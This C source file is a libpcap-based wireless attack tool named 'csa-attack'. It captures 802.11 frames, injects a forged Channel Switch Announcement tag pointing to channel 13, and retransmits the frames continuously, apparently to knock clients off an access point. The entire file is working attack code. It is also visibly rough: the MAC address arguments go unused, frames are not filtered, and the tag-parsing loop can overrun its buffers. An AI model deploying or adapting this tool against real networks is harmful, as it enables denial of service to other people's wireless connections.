#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>

#define CSA_TAG_NUMBER 0x25
#define CSA_TAG_LENGTH 0x03
#define CHANNEL_SWITCH_MODE 0x01
#define NEW_CHANNEL_NUMBER 0x0D
#define CHANNEL_SWITCH_COUNT 0x03
#define COUNTRY_INFORMATION_TAG 0x07
#define ERP_TAG_NUMBER 0x2A
#define ERP_TAG_LENGTH 0x01
#define TAGGED_PARAMS_OFFSET 0x36

void usage() {
    printf("syntax : csa-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void insert_csa_tag(u_char *packet, int packet_len, u_char *new_packet, int *new_packet_len) {
    int i, offset = 0;
    int csa_tag_len = 2 + CSA_TAG_LENGTH;
    u_char csa_tag[csa_tag_len];

    csa_tag[0] = CSA_TAG_NUMBER;
    csa_tag[1] = CSA_TAG_LENGTH;
    csa_tag[2] = CHANNEL_SWITCH_MODE;
    csa_tag[3] = NEW_CHANNEL_NUMBER;
    csa_tag[4] = CHANNEL_SWITCH_COUNT;

    memcpy(new_packet, packet, TAGGED_PARAMS_OFFSET);
    offset = TAGGED_PARAMS_OFFSET;

    int pos = TAGGED_PARAMS_OFFSET;
    while (pos < packet_len) {
        if (packet[pos] == ERP_TAG_NUMBER && packet[pos+1] == ERP_TAG_LENGTH) {
            for (i = 0; i < csa_tag_len; i++) {
                new_packet[offset++] = csa_tag[i];
            }
        }
        new_packet[offset++] = packet[pos++];
        int tag_len = packet[pos];
        new_packet[offset++] = packet[pos++];
        for (i = 0; i < tag_len; i++) {
            new_packet[offset++] = packet[pos++];
        }
    }

    while (pos < packet_len) {
        new_packet[offset++] = packet[pos++];
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    struct pcap_pkthdr *header;
    const u_char *packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0) continue;

        int packet_len = header->len;
        u_char new_packet[BUFSIZ];
        int new_packet_len = packet_len + 5;

        insert_csa_tag((u_char *)packet, packet_len, new_packet, &new_packet_len);

        header->len = new_packet_len;
        header->caplen = new_packet_len;

        if (pcap_sendpacket(handle, new_packet, new_packet_len) != 0) {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
            return -1;
        }

        usleep(100);
    }

    pcap_close(handle);
    return 0;
}
